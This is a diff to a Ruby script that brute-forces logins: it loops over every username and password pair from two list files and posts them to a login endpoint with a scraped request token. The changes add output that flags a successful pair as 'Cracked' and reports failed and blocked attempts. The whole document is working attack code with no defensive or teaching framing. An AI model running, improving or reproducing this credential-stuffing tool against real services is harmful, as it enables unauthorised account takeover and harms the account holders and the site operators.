@@ -3,8 +3,8 @@ require 'net/http'
 require 'net/https'
 require 'jwt'
 require 'json'
-usernames = File.readlines("u.txt")
-passwords = File.readlines("p.txt")
+usernames = File.readlines("u.txt") # List Of Usernames
+passwords = File.readlines("p.txt") # List Of Passwords
 for username in usernames
 	for password in passwords
 		###################################
@@ -37,12 +37,20 @@ for username in usernames
 			reqsc.body = "password=#{password}&req_token=#{res.body[/"req_token":"(.+?)"/, 1]}&timestamp=#{res.body[/"timestamp":"(.+?)"/, 1]}&username=#{username}"
 			response = https.request(reqsc)
 			if response.code.include? "200"
-				puts "#{response.body}\n"
+				if response.body.include? '"logged":true'
+					puts "Cracked -> (#{username}:#{password})\n"
+				else
+					if response.body.include? 'password is incorrect'
+						puts "Failed -> (#{username}:#{password})\n"
+					else
+						puts "#{response.body}\n"
+					end
+				end
 			else
-				puts "#{response.body}\n"
+				puts "Blocked : #{response.body}\n"
 			end
 		else
-			# dude
+			puts "Shit ~~"
 		end
 	end
 end
